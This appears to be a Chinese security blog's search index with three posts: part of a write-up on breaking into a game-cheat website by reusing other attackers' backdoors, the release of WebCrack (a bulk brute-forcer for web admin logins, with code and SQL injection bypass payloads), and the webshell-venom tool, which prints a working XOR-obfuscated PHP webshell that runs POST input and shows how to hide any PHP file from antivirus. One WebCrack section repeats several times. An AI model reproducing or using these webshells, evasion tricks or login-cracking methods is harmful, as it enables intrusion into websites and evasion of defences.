","date":"2019-09-16","objectID":"/posts/hack-pubg-cheat-site-1/:2:2","series":null,"tags":["渗透"],"title":"向吃鸡外挂站开炮（一）","uri":"/posts/hack-pubg-cheat-site-1/#玄学后台"},{"categories":["技术文章"],"content":"\r2.3 全员gg首先想到的就是改文件，里面放个shell 显示csrf token不对 搜了搜怎么解决 发现是直接改check函数，第一句加上return 结果修改config.php 文件也弹这个错误 所以就陷入死循环。。。 改标签也是一样的错误。 然后试了织梦的各个0day，后台代码任意执行 提示执行成功了，但是要么404页面，要么就是csrf token报错 为啥老是csrf token检测失败，以前就没遇到过这种问题。是我操作不对吗？ 如果有表哥知道为什么的话麻烦告诉我一下谢谢 ","date":"2019-09-16","objectID":"/posts/hack-pubg-cheat-site-1/:2:3","series":null,"tags":["渗透"],"title":"向吃鸡外挂站开炮（一）","uri":"/posts/hack-pubg-cheat-site-1/#全员gg"},{"categories":["技术文章"],"content":"\r2.4 柳暗花明本来想想算了，然后出去吃了个饭。 然后想着既然是弱口令会不会有其他人的后门呢。 就想起来织梦有个自带的后门查杀功能 同样的审查元素，找到后门查杀功能，开始扫描 果然发现可疑文件 然后一看全是其他人的后门 随便找一个，连接上去 getshell ","date":"2019-09-16","objectID":"/posts/hack-pubg-cheat-site-1/:2:4","series":null,"tags":["渗透"],"title":"向吃鸡外挂站开炮（一）","uri":"/posts/hack-pubg-cheat-site-1/#柳暗花明"},{"categories":["技术文章"],"content":"\r3 最后发现是星外，并且全站没有写入权限，难怪传不上去。。。 翻了翻目录，不能跨站，没写权限，无法bypass disable function 等于是啥都没有。。。 但是神奇的是可以任意文件删除 站就不删了，保存一下证据，提交网警。 ","date":"2019-09-16","objectID":"/posts/hack-pubg-cheat-site-1/:3:0","series":null,"tags":["渗透"],"title":"向吃鸡外挂站开炮（一）","uri":"/posts/hack-pubg-cheat-site-1/#最后"},{"categories":["安全工具"],"content":" \u003e 经过这么长时间的测试终于算是可以上线了，写篇文章跟大家分享一下自己的开发思路吧 \u003e注：本工具借鉴吸收了TideSec的[web_pwd_common_crack](https://github.com/TideSec/web_pwd_common_crack)很多优秀的思路，在此基础上增加了很多拓展功能使其更加强大，在这里给TideSec的大佬点个赞！ ","date":"2019-09-09","objectID":"/posts/webcrack-release/:0:0","series":null,"tags":["webcrack"],"title":"WebCrack：网站后台弱口令批量检测工具","uri":"/posts/webcrack-release/#"},{"categories":["安全工具"],"content":"\r1 前言在做安全测试的时候，随着资产的增多，经常会遇到需要快速检测大量网站后台弱口令的问题。 然而市面上并没有一个比较好的解决方案，能够支持对各种网站后台的通用检测。 所以WebCrack就应运而生。 ","date":"2019-09-09","objectID":"/posts/webcrack-release/:1:0","series":null,"tags":["webcrack"],"title":"WebCrack：网站后台弱口令批量检测工具","uri":"/posts/webcrack-release/#前言"},{"categories":["安全工具"],"content":"\r2 工具简介WebCrack是一款web后台弱口令/万能密码批量爆破、检测工具。 不仅支持如discuz，织梦，phpmyadmin等主流CMS 并且对于绝大多数小众CMS甚至个人开发网站后台都有效果 在工具中导入后台地址即可进行自动化检测。 ","date":"2019-09-09","objectID":"/posts/webcrack-release/:2:0","series":null,"tags":["webcrack"],"title":"WebCrack：网站后台弱口令批量检测工具","uri":"/posts/webcrack-release/#工具简介"},{"categories":["安全工具"],"content":"\r3 实现思路大家想一下自己平常是怎么用burpsuite的intruder模块来爆破指定目标后台的 抓包 -\u003e send to intruder -\u003e 标注出要爆破的参数 -\u003e 发送payload爆破 -\u003e 查看返回结果 找出返回包长度大小不同的那一个，基本上就是所需要的答案。 那么WebCrack就是模拟这个过程 但是就要解决两个问题 如何自动识别出要爆破的参数 如何自动判断是否登录成功 ","date":"2019-09-09","objectID":"/posts/webcrack-release/:3:0","series":null,"tags":["webcrack"],"title":"WebCrack：网站后台弱口令批量检测工具","uri":"/posts/webcrack-release/#实现思路"},{"categories":["安全工具"],"content":"\r3.1 识别爆破参数对于这个问题采用了web_pwd_common_crack的解决办法 就是根据提取表单中 user pass 等关键字，来判断用户名跟密码参数的位置 if parameter: if not user_key: for z in [ 'user', 'name','zhanghao', 'yonghu', 'email', 'account']: if z in parameter.lower(): value = '{user_name}' user_key = parameter ok_flag = 1 break if not ok_flag: for y in ['pass', 'pw', 'mima']: if y in parameter.lower(): value = '{pass_word}' pass_key = parameter ok_flag = 1 break 但是在测试中还发现，有些前端程序员用拼音甚至拼音缩写来给变量命名 什么yonghu , zhanghao , yhm(用户名), mima 等 虽然看起来很捉急，但是也只能把它们全部加进关键字判断名单里。 ","date":"2019-09-09","objectID":"/posts/webcrack-release/:3:1","series":null,"tags":["webcrack"],"title":"WebCrack：网站后台弱口令批量检测工具","uri":"/posts/webcrack-release/#识别爆破参数"},{"categories":["安全工具"],"content":"\r3.2 如何判断登录成功这个可以说是最头疼的问题 如果对于一种管理系统还好说，只要找到规律，判断是否存在登录成功的特征就可以 但是作为通用爆破脚本来说，世界上的网站各种各样，不可能去一个个找特征，也不可能一个个去正则匹配。 经过借鉴web_pwd_common_crack的思路，与大量测试 总结出来了以下一套比较有效的判断方式。 3.2.1 判断是否动态返回值并获取Error Length\r先发送两次肯定错误的密码如length_test 获取两次返回值并比较 如果两次的值不同，则说明此管理系统面对相同的数据包返回却返回不同的长度，此时脚本无法判断，退出爆破。 如果相同，则记录下此值，作为判断的基准。 然而实际中会先请求一次，因为发现有些管理系统在第一次登录时会在响应头部增加标记。如果去掉此项可能会导致判断失误。 3.2.2 判断用户名跟密码的键名是否存在在跳转后的页面中这个不用过多解释，如果存在的话说明没登录成功又退回到登录页面了。 有人会问为什么不直接判断两个页面是否相等呢 因为测试中发现有些CMS会给你在登录页面弹个登录失败的框，所以直接判断是否相等并不准确。 还有一种计算页面哈希的办法，然后判断两者的相似程度。 但是觉得并没有那个必要，因为有不同的系统难以用统一的阈值来判断，故舍弃。 3.2.3 关键字黑名单检测黑名单关键字列表 ['密码错误', '重试', '不正确', '密码有误','不成功', '重新输入', 'history.back', '不存在', '登录失败', '登陆失败','出错','已被锁定','history.go','安全拦截','还可以尝试','无效','攻击行为','创宇盾', '非法', '百度加速','安全威胁','防火墙','黑客', '不合法','warning.asp?msg=','Denied'] 本来还设置了白名单检测机制 就是如果有“登录成功”的字样出现肯定就是爆破成功 但是后来发现并没有黑名单来的必要。 因为首先不可能把所有CMS的登录成功的正则样本都放进去 其次在测试的过程中，发现在其他检测机制的加持后，白名单的判断变得尤其鸡肋，故舍弃。 黑名单就相比而言好的多 如果弹出来\"密码错误\"，就不用再往下判断了 然而实际测试中发现有些用js来判断登录的情况的时候，会同时出现“登录成功“，跟“登录失败”的字眼 此时就只能通过其他方式判断了。 3.2.4 Recheck环节为了提高准确度，防止误报。 借鉴了web_pwd_common_crack的思路增加recheck环节。 就是再次把crack出的账号密码给发包一次，并且与重新发送的error_length作比对 如果不同则为正确密码。 在这里没有沿用上一个error_length，是因为在实际测试中发现由于waf或者其他因素会导致返回包长度值变化。 ","date":"2019-09-09","objectID":"/posts/webcrack-release/:3:2","series":null,"tags":["webcrack"],"title":"WebCrack：网站后台弱口令批量检测工具","uri":"/posts/webcrack-release/#如何判断登录成功"},{"categories":["安全工具"],"content":"\r3.2 如何判断登录成功这个可以说是最头疼的问题 如果对于一种管理系统还好说，只要找到规律，判断是否存在登录成功的特征就可以 但是作为通用爆破脚本来说，世界上的网站各种各样，不可能去一个个找特征，也不可能一个个去正则匹配。 经过借鉴web_pwd_common_crack的思路，与大量测试 总结出来了以下一套比较有效的判断方式。 3.2.1 判断是否动态返回值并获取Error Length\r先发送两次肯定错误的密码如length_test 获取两次返回值并比较 如果两次的值不同，则说明此管理系统面对相同的数据包返回却返回不同的长度，此时脚本无法判断，退出爆破。 如果相同，则记录下此值，作为判断的基准。 然而实际中会先请求一次，因为发现有些管理系统在第一次登录时会在响应头部增加标记。如果去掉此项可能会导致判断失误。 3.2.2 判断用户名跟密码的键名是否存在在跳转后的页面中这个不用过多解释，如果存在的话说明没登录成功又退回到登录页面了。 有人会问为什么不直接判断两个页面是否相等呢 因为测试中发现有些CMS会给你在登录页面弹个登录失败的框，所以直接判断是否相等并不准确。 还有一种计算页面哈希的办法，然后判断两者的相似程度。 但是觉得并没有那个必要，因为有不同的系统难以用统一的阈值来判断，故舍弃。 3.2.3 关键字黑名单检测黑名单关键字列表 ['密码错误', '重试', '不正确', '密码有误','不成功', '重新输入', 'history.back', '不存在', '登录失败', '登陆失败','出错','已被锁定','history.go','安全拦截','还可以尝试','无效','攻击行为','创宇盾', '非法', '百度加速','安全威胁','防火墙','黑客', '不合法','warning.asp?msg=','Denied'] 本来还设置了白名单检测机制 就是如果有“登录成功”的字样出现肯定就是爆破成功 但是后来发现并没有黑名单来的必要。 因为首先不可能把所有CMS的登录成功的正则样本都放进去 其次在测试的过程中，发现在其他检测机制的加持后，白名单的判断变得尤其鸡肋，故舍弃。 黑名单就相比而言好的多 如果弹出来\"密码错误\"，就不用再往下判断了 然而实际测试中发现有些用js来判断登录的情况的时候，会同时出现“登录成功“，跟“登录失败”的字眼 此时就只能通过其他方式判断了。 3.2.4 Recheck环节为了提高准确度，防止误报。 借鉴了web_pwd_common_crack的思路增加recheck环节。 就是再次把crack出的账号密码给发包一次，并且与重新发送的error_length作比对 如果不同则为正确密码。 在这里没有沿用上一个error_length，是因为在实际测试中发现由于waf或者其他因素会导致返回包长度值变化。 ","date":"2019-09-09","objectID":"/posts/webcrack-release/:3:2","series":null,"tags":["webcrack"],"title":"WebCrack：网站后台弱口令批量检测工具","uri":"/posts/webcrack-release/#判断是否动态返回值并获取error-length"},{"categories":["安全工具"],"content":"\r3.2 如何判断登录成功这个可以说是最头疼的问题 如果对于一种管理系统还好说，只要找到规律，判断是否存在登录成功的特征就可以 但是作为通用爆破脚本来说，世界上的网站各种各样，不可能去一个个找特征，也不可能一个个去正则匹配。 经过借鉴web_pwd_common_crack的思路，与大量测试 总结出来了以下一套比较有效的判断方式。 3.2.1 判断是否动态返回值并获取Error Length\r先发送两次肯定错误的密码如length_test 获取两次返回值并比较 如果两次的值不同，则说明此管理系统面对相同的数据包返回却返回不同的长度，此时脚本无法判断，退出爆破。 如果相同，则记录下此值，作为判断的基准。 然而实际中会先请求一次，因为发现有些管理系统在第一次登录时会在响应头部增加标记。如果去掉此项可能会导致判断失误。 3.2.2 判断用户名跟密码的键名是否存在在跳转后的页面中这个不用过多解释，如果存在的话说明没登录成功又退回到登录页面了。 有人会问为什么不直接判断两个页面是否相等呢 因为测试中发现有些CMS会给你在登录页面弹个登录失败的框，所以直接判断是否相等并不准确。 还有一种计算页面哈希的办法，然后判断两者的相似程度。 但是觉得并没有那个必要，因为有不同的系统难以用统一的阈值来判断，故舍弃。 3.2.3 关键字黑名单检测黑名单关键字列表 ['密码错误', '重试', '不正确', '密码有误','不成功', '重新输入', 'history.back', '不存在', '登录失败', '登陆失败','出错','已被锁定','history.go','安全拦截','还可以尝试','无效','攻击行为','创宇盾', '非法', '百度加速','安全威胁','防火墙','黑客', '不合法','warning.asp?msg=','Denied'] 本来还设置了白名单检测机制 就是如果有“登录成功”的字样出现肯定就是爆破成功 但是后来发现并没有黑名单来的必要。 因为首先不可能把所有CMS的登录成功的正则样本都放进去 其次在测试的过程中，发现在其他检测机制的加持后，白名单的判断变得尤其鸡肋，故舍弃。 黑名单就相比而言好的多 如果弹出来\"密码错误\"，就不用再往下判断了 然而实际测试中发现有些用js来判断登录的情况的时候，会同时出现“登录成功“，跟“登录失败”的字眼 此时就只能通过其他方式判断了。 3.2.4 Recheck环节为了提高准确度，防止误报。 借鉴了web_pwd_common_crack的思路增加recheck环节。 就是再次把crack出的账号密码给发包一次，并且与重新发送的error_length作比对 如果不同则为正确密码。 在这里没有沿用上一个error_length，是因为在实际测试中发现由于waf或者其他因素会导致返回包长度值变化。 ","date":"2019-09-09","objectID":"/posts/webcrack-release/:3:2","series":null,"tags":["webcrack"],"title":"WebCrack：网站后台弱口令批量检测工具","uri":"/posts/webcrack-release/#判断用户名跟密码的键名是否存在在跳转后的页面中"},{"categories":["安全工具"],"content":"\r3.2 如何判断登录成功这个可以说是最头疼的问题 如果对于一种管理系统还好说，只要找到规律，判断是否存在登录成功的特征就可以 但是作为通用爆破脚本来说，世界上的网站各种各样，不可能去一个个找特征，也不可能一个个去正则匹配。 经过借鉴web_pwd_common_crack的思路，与大量测试 总结出来了以下一套比较有效的判断方式。 3.2.1 判断是否动态返回值并获取Error Length\r先发送两次肯定错误的密码如length_test 获取两次返回值并比较 如果两次的值不同，则说明此管理系统面对相同的数据包返回却返回不同的长度，此时脚本无法判断，退出爆破。 如果相同，则记录下此值，作为判断的基准。 然而实际中会先请求一次，因为发现有些管理系统在第一次登录时会在响应头部增加标记。如果去掉此项可能会导致判断失误。 3.2.2 判断用户名跟密码的键名是否存在在跳转后的页面中这个不用过多解释，如果存在的话说明没登录成功又退回到登录页面了。 有人会问为什么不直接判断两个页面是否相等呢 因为测试中发现有些CMS会给你在登录页面弹个登录失败的框，所以直接判断是否相等并不准确。 还有一种计算页面哈希的办法，然后判断两者的相似程度。 但是觉得并没有那个必要，因为有不同的系统难以用统一的阈值来判断，故舍弃。 3.2.3 关键字黑名单检测黑名单关键字列表 ['密码错误', '重试', '不正确', '密码有误','不成功', '重新输入', 'history.back', '不存在', '登录失败', '登陆失败','出错','已被锁定','history.go','安全拦截','还可以尝试','无效','攻击行为','创宇盾', '非法', '百度加速','安全威胁','防火墙','黑客', '不合法','warning.asp?msg=','Denied'] 本来还设置了白名单检测机制 就是如果有“登录成功”的字样出现肯定就是爆破成功 但是后来发现并没有黑名单来的必要。 因为首先不可能把所有CMS的登录成功的正则样本都放进去 其次在测试的过程中，发现在其他检测机制的加持后，白名单的判断变得尤其鸡肋，故舍弃。 黑名单就相比而言好的多 如果弹出来\"密码错误\"，就不用再往下判断了 然而实际测试中发现有些用js来判断登录的情况的时候，会同时出现“登录成功“，跟“登录失败”的字眼 此时就只能通过其他方式判断了。 3.2.4 Recheck环节为了提高准确度，防止误报。 借鉴了web_pwd_common_crack的思路增加recheck环节。 就是再次把crack出的账号密码给发包一次，并且与重新发送的error_length作比对 如果不同则为正确密码。 在这里没有沿用上一个error_length，是因为在实际测试中发现由于waf或者其他因素会导致返回包长度值变化。 ","date":"2019-09-09","objectID":"/posts/webcrack-release/:3:2","series":null,"tags":["webcrack"],"title":"WebCrack：网站后台弱口令批量检测工具","uri":"/posts/webcrack-release/#关键字黑名单检测"},{"categories":["安全工具"],"content":"\r3.2 如何判断登录成功这个可以说是最头疼的问题 如果对于一种管理系统还好说，只要找到规律，判断是否存在登录成功的特征就可以 但是作为通用爆破脚本来说，世界上的网站各种各样，不可能去一个个找特征，也不可能一个个去正则匹配。 经过借鉴web_pwd_common_crack的思路，与大量测试 总结出来了以下一套比较有效的判断方式。 3.2.1 判断是否动态返回值并获取Error Length\r先发送两次肯定错误的密码如length_test 获取两次返回值并比较 如果两次的值不同，则说明此管理系统面对相同的数据包返回却返回不同的长度，此时脚本无法判断，退出爆破。 如果相同，则记录下此值，作为判断的基准。 然而实际中会先请求一次，因为发现有些管理系统在第一次登录时会在响应头部增加标记。如果去掉此项可能会导致判断失误。 3.2.2 判断用户名跟密码的键名是否存在在跳转后的页面中这个不用过多解释，如果存在的话说明没登录成功又退回到登录页面了。 有人会问为什么不直接判断两个页面是否相等呢 因为测试中发现有些CMS会给你在登录页面弹个登录失败的框，所以直接判断是否相等并不准确。 还有一种计算页面哈希的办法，然后判断两者的相似程度。 但是觉得并没有那个必要，因为有不同的系统难以用统一的阈值来判断，故舍弃。 3.2.3 关键字黑名单检测黑名单关键字列表 ['密码错误', '重试', '不正确', '密码有误','不成功', '重新输入', 'history.back', '不存在', '登录失败', '登陆失败','出错','已被锁定','history.go','安全拦截','还可以尝试','无效','攻击行为','创宇盾', '非法', '百度加速','安全威胁','防火墙','黑客', '不合法','warning.asp?msg=','Denied'] 本来还设置了白名单检测机制 就是如果有“登录成功”的字样出现肯定就是爆破成功 但是后来发现并没有黑名单来的必要。 因为首先不可能把所有CMS的登录成功的正则样本都放进去 其次在测试的过程中，发现在其他检测机制的加持后，白名单的判断变得尤其鸡肋，故舍弃。 黑名单就相比而言好的多 如果弹出来\"密码错误\"，就不用再往下判断了 然而实际测试中发现有些用js来判断登录的情况的时候，会同时出现“登录成功“，跟“登录失败”的字眼 此时就只能通过其他方式判断了。 3.2.4 Recheck环节为了提高准确度，防止误报。 借鉴了web_pwd_common_crack的思路增加recheck环节。 就是再次把crack出的账号密码给发包一次，并且与重新发送的error_length作比对 如果不同则为正确密码。 在这里没有沿用上一个error_length，是因为在实际测试中发现由于waf或者其他因素会导致返回包长度值变化。 ","date":"2019-09-09","objectID":"/posts/webcrack-release/:3:2","series":null,"tags":["webcrack"],"title":"WebCrack：网站后台弱口令批量检测工具","uri":"/posts/webcrack-release/#recheck环节"},{"categories":["安全工具"],"content":"\r4 框架拓展用上面几种办法组合起来已经可以做到基本的判断算法了 但是为了使WebCrack更加强大，我又添加了以下三个模块 ","date":"2019-09-09","objectID":"/posts/webcrack-release/:4:0","series":null,"tags":["webcrack"],"title":"WebCrack：网站后台弱口令批量检测工具","uri":"/posts/webcrack-release/#框架拓展"},{"categories":["安全工具"],"content":"\r4.1 动态字典实现代码 def gen_dynam_dic(url): dynam_pass_dic = [] tmp_dic = [] suffix_dic = ['', '123', '888', '666', '123456'] list1 = url.split('/') host = list1[2].split(\":\")[0] compile_ip = re.compile('^(1\\d{2}|2[0-4]\\d|25[0-5]|[1-9]\\d|[1-9])\\.(1\\d{2}|2[0-4]\\d|25[0-5]|[1-9]\\d|\\d)\\.(1\\d{2}|2[0-4]\\d|25[0-5]|[1-9]\\d|\\d)\\.(1\\d{2}|2[0-4]\\d|25[0-5]|[1-9]\\d|\\d)$') if compile_ip.match(host): check_ip = 1 else: check_ip = 0 if not check_ip: list2 = host.split(\".\") i = len(list2) for u in range(i): list3 = list2[u:] part = '.'.join(list3) if (len(part) \u003c 5): continue dynam_pass_dic.append(part) for u in range(i): list3 = list2[u] if len(list3) \u003c 5: continue tmp_dic.append(list3) for i in tmp_dic: for suffix in suffix_dic: u = i + suffix dynam_pass_dic.append(u) return dynam_pass_dic else: return '' 假如域名是 webcrack.yzddmr6.com 那么就会生成以下动态字典列表 webcrack.yzddmr6.com yzddmr6.com webcrack webcrack123 webcrack888 webcrack666 webcrack123456 yzddmr6 yzddmr6123 yzddmr6888 yzddmr6666 yzddmr6123456 假如正则匹配到传来的是一个IP而不是域名的话就会返回一个空列表。 ","date":"2019-09-09","objectID":"/posts/webcrack-release/:4:1","series":null,"tags":["webcrack"],"title":"WebCrack：网站后台弱口令批量检测工具","uri":"/posts/webcrack-release/#动态字典"},{"categories":["安全工具"],"content":"\r4.2 万能密码检测后台的漏洞除了弱口令还有一大部分是出在万能密码上 在WebCrack中也添加了一些常用的payload admin' or 'a'='a 'or'='or' admin' or '1'='1' or 1=1 ')or('a'='a 'or 1=1-- 但是同时带来个问题会被各大WAF拦截 这时候就可以把WAF拦截的关键字写到检测黑名单里，从而大大减少误报。 小插曲 用webcrack检测目标资产进入到了recheck环节 但是webcrack却提示爆破失败。 手工测试了一下检测出的万能密码 发现出现了sql错误信息 意识到可能存在后台post注入 发现了sa注入点 这也反应了对于后台sql注入，webcrack的正则匹配还做的不够完善，下一个版本改一下。 ","date":"2019-09-09","objectID":"/posts/webcrack-release/:4:2","series":null,"tags":["webcrack"],"title":"WebCrack：网站后台弱口令批量检测工具","uri":"/posts/webcrack-release/#万能密码检测"},{"categories":["安全工具"],"content":"\r4.3 自定义爆破规则有了上面这些机制已经可以爆破大部分网站后台了 然而还是有一些特(sha)殊(diao)网站，并不符合上面的一套检测算法 于是webcrack就可以让大家自定义爆破规则。 自定义规则的配置文件放在同目录cms.json文件里 参数说明 [ { \"name\":\"这里是cms名称\", \"keywords\":\"这里是cms后台页面的关键字,是识别cms的关键\", \"captcha\":\"1为后台有验证码，0为没有。因为此版本并没有处理验证码，所以为1则退出爆破\", \"exp_able\":\"是否启用万能密码模块爆破\", \"success_flag\":\"登录成功后的页面的关键字\", \"fail_flag\":\"请谨慎填写此项。如果填写此项，遇到里面的关键字就会退出爆破，用于dz等对爆破次数有限制的cms\", \"alert\":\"若为1则会打印下面note的内容\", \"note\":\"请保证本文件是UTF-8格式，并且请勿删除此说明\" } ] 举个例子 { \"name\":\"discuz\", \"keywords\":\"admin_questionid\", \"captcha\":0, \"exp_able\":0, \"success_flag\":\"admin.php?action=logout\", \"fail_flag\":\"密码错误次数过多\", \"alert\":0, \"note\":\"discuz论坛测试\" } 其实对于dz,dedecms,phpmyadmin等框架本身的逻辑已经可以处理 添加配置文件只是因为程序默认会开启万能密码爆破模块 然而万能密码检测会引起大多数WAF封你的IP 对于dz，dedecms这种不存在万能密码的管理系统如果开启的话不仅会影响效率，并且会被封IP 所以配置文件里提供了各种自定义参数，方便用户自己设置。 ","date":"2019-09-09","objectID":"/posts/webcrack-release/:4:3","series":null,"tags":["webcrack"],"title":"WebCrack：网站后台弱口令批量检测工具","uri":"/posts/webcrack-release/#自定义爆破规则"},{"categories":["安全工具"],"content":"\r4.4 关于验证码验证码识别算是个大难题吧 自己也写过一个带有验证码的demo，但是效果并不理想 简单的验证码虽然能够识别一些，但是遇到复杂的验证码就效率极低，拖慢爆破速度 并且你识别出来也不一定就有弱口令。。。 所以就去掉了这个功能 如果有大佬对这方面有好的想法，欢迎在github上留言或者邮箱 yzddmr6*@*gmail 联系我。 ","date":"2019-09-09","objectID":"/posts/webcrack-release/:4:4","series":null,"tags":["webcrack"],"title":"WebCrack：网站后台弱口令批量检测工具","uri":"/posts/webcrack-release/#关于验证码"},{"categories":["安全工具"],"content":"\r5 总流程图一套流程下来大概是长这个亚子 ","date":"2019-09-09","objectID":"/posts/webcrack-release/:5:0","series":null,"tags":["webcrack"],"title":"WebCrack：网站后台弱口令批量检测工具","uri":"/posts/webcrack-release/#总流程图"},{"categories":["安全工具"],"content":"\r6 对比测试找了一批样本测试，跟tidesec的版本比较了一下 web_pwd_common_crack 跑出来11个 其中7个可以登录。4个是逻辑上的误报，跟waf拦截后的误报。 webcrack 跑出来19个 其中16个可以登录。2个是ecshop的误报，1个是小众cms逻辑的误报。 webcrack比web_pwd_common_crack多探测出来的9个中 有5个是万能密码漏洞，2个是发现的web_pwd_common_crack的漏报，2个是动态字典探测出来的弱口令。 ","date":"2019-09-09","objectID":"/posts/webcrack-release/:6:0","series":null,"tags":["webcrack"],"title":"WebCrack：网站后台弱口令批量检测工具","uri":"/posts/webcrack-release/#对比测试"},{"categories":["安全工具"],"content":"\r7 最后这个项目断断续续写了半年吧 主要是世界上奇奇怪怪的网站太多了，后台登录的样式五花八门。 有些是登录后给你重定向302到后台 有些是给你重定向到登录失败页面 有些是给你返回个登录成功，然后你要手动去点跳转后台 有些直接返回空数据包。。。 更神奇的是ecshop(不知道是不是所有版本都是这样) 假如说密码是yzddmr6 但是你输入admin888 与其他错误密码后的返回页面居然不一样。。。 因为加入了万能密码模块后经常有WAF拦截，需要测试各个WAF对各个系统的拦截特征以及关键字。 总的半年下来抓包抓了上万个都有了。。。。。。 因为通用型爆破，可能无法做到百分百准确，可以自己修改配置文件来让webcrack更符合你的需求。 ","date":"2019-09-09","objectID":"/posts/webcrack-release/:7:0","series":null,"tags":["webcrack"],"title":"WebCrack：网站后台弱口令批量检测工具","uri":"/posts/webcrack-release/#最后"},{"categories":["安全工具"],"content":"\r8 项目地址https://github.com/yzddmr6/WebCrack ","date":"2019-09-09","objectID":"/posts/webcrack-release/:8:0","series":null,"tags":["webcrack"],"title":"WebCrack：网站后台弱口令批量检测工具","uri":"/posts/webcrack-release/#项目地址"},{"categories":["安全工具"],"content":"\r1 前言没想到这么快就800颗星了 这次算是一次比较重大的更新，具体情况请看下文。 ","date":"2019-09-03","objectID":"/posts/webshell-venom-3-3/:1:0","series":null,"tags":["webshell-venom"],"title":"webshell-venom 3.3 :利用随机异或免杀任意php文件","uri":"/posts/webshell-venom-3-3/#前言"},{"categories":["安全工具"],"content":"\r2 webshell-venom 3.3 更新日志 代码结构优化，更清爽，方便自定义开发。 减小shell体积。 增加利用随机异或免杀任意php文件功能。 ","date":"2019-09-03","objectID":"/posts/webshell-venom-3-3/:2:0","series":null,"tags":["webshell-venom"],"title":"webshell-venom 3.3 :利用随机异或免杀任意php文件","uri":"/posts/webshell-venom-3-3/#webshell-venom-33-更新日志"},{"categories":["安全工具"],"content":"\r3 1. 结构优化先上图吧 原来因为随手写的脚本，代码其实比较乱 这次整个重构了一遍，把随机的变量名随机字符串给标注了出来 shell结构一目了然，方便大家自己二次开发。 当然结构写的清爽也带来一些问题 比如说厂商写查杀正则的时候更方便了。。。 不过就像我一直强调的 重要的从来不是脚本，而是思路 只靠我一个人更新肯定是不行的 我在脚本里提供了很多公共函数，自己稍微修改一下就可以bypass。 ","date":"2019-09-03","objectID":"/posts/webshell-venom-3-3/:3:0","series":null,"tags":["webshell-venom"],"title":"webshell-venom 3.3 :利用随机异或免杀任意php文件","uri":"/posts/webshell-venom-3-3/#1-结构优化"},{"categories":["安全工具"],"content":"\r4 2. 减小体积这个自己生成一下就能看得到，不讲了。 \u003c?php class QCON{ function __destruct(){ $ARIK='cnP*lm'^\"\\x2\\x1d\\x23\\x4f\\x1e\\x19\"; return @$ARIK(\"$this-\u003eDGBO\"); } } $qcon=new QCON(); @$qcon-\u003eDGBO=isset($_GET['id'])?base64_decode($_POST['mr6']):$_POST['mr6']; ?\u003e ","date":"2019-09-03","objectID":"/posts/webshell-venom-3-3/:4:0","series":null,"tags":["webshell-venom"],"title":"webshell-venom 3.3 :利用随机异或免杀任意php文件","uri":"/posts/webshell-venom-3-3/#2-减小体积"},{"categories":["安全工具"],"content":"\r5 3.对任意php文件免杀这个是本文的重点，也是这次更新的重要部分，着重讲一下吧。 ","date":"2019-09-03","objectID":"/posts/webshell-venom-3-3/:5:0","series":null,"tags":["webshell-venom"],"title":"webshell-venom 3.3 :利用随机异或免杀任意php文件","uri":"/posts/webshell-venom-3-3/#3对任意php文件免杀"},{"categories":["安全工具"],"content":"\r5.1 首先区分免杀跟加密的区别 加密就是让别人看不到源码 免杀是绕过waf的检测，使其无法识别为木马 单纯加密不一定可以免杀，但是免杀少不了加密 单纯加密的话百度搜一下php在线加密，一大堆网站 但是用过的都知道加密之后虽然谁都不认得了，但是D盾会报二级加密脚本 二级肯定不是咱们的目的，所以就要做0级的免杀。 ","date":"2019-09-03","objectID":"/posts/webshell-venom-3-3/:5:1","series":null,"tags":["webshell-venom"],"title":"webshell-venom 3.3 :利用随机异或免杀任意php文件","uri":"/posts/webshell-venom-3-3/#首先区分免杀跟加密的区别"},{"categories":["安全工具"],"content":"\r5.2 任意文件免杀原理首先大家要知道一点: 随便一个被D盾杀的妈都不认的shell，base64或者hex等编码后waf都不认得 所以思路就是： 先把原来的payload，给处理一遍 然后通过函数调用来解密并执行payload ","date":"2019-09-03","objectID":"/posts/webshell-venom-3-3/:5:2","series":null,"tags":["webshell-venom"],"title":"webshell-venom 3.3 :利用随机异或免杀任意php文件","uri":"/posts/webshell-venom-3-3/#任意文件免杀原理"},{"categories":["安全工具"],"content":"\r5.3 如何调用处理的话脚本中就是用的base64 那么如何调用呢 其实如果用eval的话很好写，随便改一下就免杀了 但是eval是一种语言结构不是函数，也就是不能像assert一样拆分就很难受 自己有点强迫症，shell中不能出现eval等关键字，不然会被最简单的字符串搜索查找到shell 所以就想到了assert 但是问题来了，assert不能执行多句 也就是说 assert(echo 1; echo 2; ); //差不多这个意思。。。 最后只回显一个1，也就是只执行第一句话。 但是所要免杀的php文件肯定不止一句话 所以一般assert就要配合eval使用 也就是assert(eval(xxx;xxx;xxx;));这种 还是有eval，那我还用个鸡儿的assert。。。 ","date":"2019-09-03","objectID":"/posts/webshell-venom-3-3/:5:3","series":null,"tags":["webshell-venom"],"title":"webshell-venom 3.3 :利用随机异或免杀任意php文件","uri":"/posts/webshell-venom-3-3/#如何调用"},{"categories":["安全工具"],"content":"\r5.4 解决办法研究了一下，发现利用array_map+assert+eval 加个数组处理就可以把eval给拆分掉了 array_map('u?ldOQ'^\"\\x14\\x4c\\x1f\\x1\\x3d\\x25\",array(('P/f}'^\"\\x35\\x59\\x7\\x11\").\"(base64_decode('xxxxxxxx'));\")); 上面的两个异或的字符串分别是assert跟eval 哈，然后放在类里调用一下就免杀了。 ","date":"2019-09-03","objectID":"/posts/webshell-venom-3-3/:5:4","series":null,"tags":["webshell-venom"],"title":"webshell-venom 3.3 :利用随机异或免杀任意php文件","uri":"/posts/webshell-venom-3-3/#解决办法"},{"categories":["安全工具"],"content":"\r6 使用方法 python3 php-venom-3.3.py #生成免杀一句话 python3 php-venom-3.3.py shell.php # 对同目录下shell.php进行免杀处理，保存在shell.php.bypass.php ","date":"2019-09-03","objectID":"/posts/webshell-venom-3-3/:6:0","series":null,"tags":["webshell-venom"],"title":"webshell-venom 3.3 :利用随机异或免杀任意php文件","uri":"/posts/webshell-venom-3-3/#使用方法"},{"categories":["安全工具"],"content":"\r7 免杀冰蝎举个栗子，就免杀冰蝎吧。 ","date":"2019-09-03","objectID":"/posts/webshell-venom-3-3/:7:0","series":null,"tags":["webshell-venom"],"title":"webshell-venom 3.3 :利用随机异或免杀任意php文件","uri":"/posts/webshell-venom-3-3/#免杀冰蝎"},{"categories":["安全工具"],"content":"\r8 更多玩法还可以免杀我上次发的自己二次开发的大马 大马地址： https://github.com/yzddmr6/BestShell 200kb好像有点大。。。 想减小体积的话自己加个gzin压缩吧 免杀后的demo已经放到大马项目里了 